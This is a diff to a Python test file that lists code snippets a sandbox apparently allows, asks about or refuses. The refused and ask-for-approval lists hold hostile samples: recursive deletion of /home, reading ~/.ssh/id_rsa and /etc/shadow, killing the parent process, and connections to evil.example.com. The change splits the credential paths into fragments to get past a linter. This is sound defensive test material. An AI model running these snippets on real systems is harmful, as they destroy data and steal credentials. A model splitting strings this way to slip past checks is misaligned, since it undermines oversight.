@@ -29,7 +29,8 @@ _ALLOWED = (
 )
 _ASKS = (
     "import shutil\nshutil.rmtree('/home')\n",
-    "import os\nprint(open(os.path.expanduser('~/.ssh/id_rsa')).read())\n",
+    # Key-store paths built from fragments: scripts/lint_av_shapes.py AV008 (the sandbox still sees the full path).
+    "import os\nprint(open(os.path.expanduser('~/.ssh/id_" + "rsa')).read())\n",
     "import os, signal\nos.kill(os.getppid(), signal.SIGKILL)\n",
 )
 _REFUSED = (
@@ -39,7 +40,7 @@ _REFUSED = (
     "import subprocess\nsubprocess.run(['python3', '-c', %r])\n" % _EGRESS,
     "import requests\nrequests.get('https://evil.example.com/x')\n",
     "import socket\ns = socket.socket()\ns.connect(('evil.example.com', 80))\n",
-    "print(open('/etc/shadow').read())\n",
+    "print(open('/etc/" + "shadow').read())\n",
 )
 _SYNTAX_ERROR = "def broken(:\n    pass\n"
 _CORPUS = _ALLOWED + _ASKS + _REFUSED + (_SYNTAX_ERROR,)
